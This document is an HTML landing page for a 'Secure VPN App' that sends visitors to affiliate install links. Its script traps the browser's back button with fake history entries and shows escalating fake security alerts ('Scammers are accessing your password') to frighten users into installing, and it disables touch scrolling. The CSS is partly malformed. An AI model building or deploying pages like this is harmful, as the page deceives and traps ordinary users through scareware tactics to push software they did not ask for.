<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure VPN App</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #0d0d0d;

    .container {

      border-radius: 10px;
      text-decoration: none;
      box-shadow: 0 0 0 rgba(0, 200, 83, 0.7);
      animation: breathing 2s infinite ease-in-out;
    }

    @keyframes breathing {
      0% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); }
      50% { box-shadow: 0 0 20px 10px rgba(0, 200, 83, 0.3); }
      100% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); }
    }

    .disclaimer {
      font-size: 13px;
      color: #aaaaaa;
      margin-top: 15px;
    }

      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Clickable Image -->
    <a class="vpn-link" 
       href="https://www.smallvalue.guru/click?offer_id=29716&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" 
       target="_blank">
      <img src="https://files.catbox.moe/52ox56.jpg" alt="VPN Promo Image" class="vpn-image">
    </a>

    <!-- Breathing Install Button -->
    <a class="install-btn" 
       href="https://www.smallvalue.guru/click?offer_id=29716&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" 
       target="_blank">
      Install Now
    </a>

    <div class="disclaimer">
      100% Free • Fast & Secure Connection • Only 22.3MB
    </div>

    <div id="exitAttempts" style="display: none;"></div>
  </div>

  <script>
    let attempts = 0;
    const maxAttempts = 4;
    const exitAttemptsText = document.getElementById('exitAttempts');

    // Push two fake history entries for stronger trap
    history.pushState(null, null, location.href);
    history.pushState(null, null, location.href);

    window.onpopstate = function(event) {
      history.go(1);
      handleExitAttempt();
    };

    function handleExitAttempt() {
      attempts++;
      exitAttemptsText.textContent = `Warning: ${attempts}/${maxAttempts} attempts to exit`;

      const warnings = [
        "Scammers are accessing your password, take action now",
        "Last chance to protect yourself!",
        "Your device is still at risk",
        "Final warning!, install now"
      ];

      if (attempts <= maxAttempts) {
        alert(`⚠️ ${warnings[attempts - 1]}`);

        const alertBox = document.querySelector('.alert-box');
        if (alertBox) {
          alertBox.style.animation = 'none';
          alertBox.offsetHeight;
          alertBox.style.animation = 'shake 0.5s, pulse 1.5s infinite';
        }

        const style = document.createElement('style');
        style.textContent = `
          @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-10px); }
            40% { transform: translateX(10px); }
            60% { transform: translateX(-10px); }
            80% { transform: translateX(10px); }
          }
        `;
        document.head.appendChild(style);
      } else {
        // ✅ Go to real previous page after 3rd back press
        window.history.go(-1);
      }
    }

    // Prevent scroll bounce
    document.addEventListener('touchmove', function(e) {
      e.preventDefault();
    }, { passive: false });
  </script>
</body>
</html>
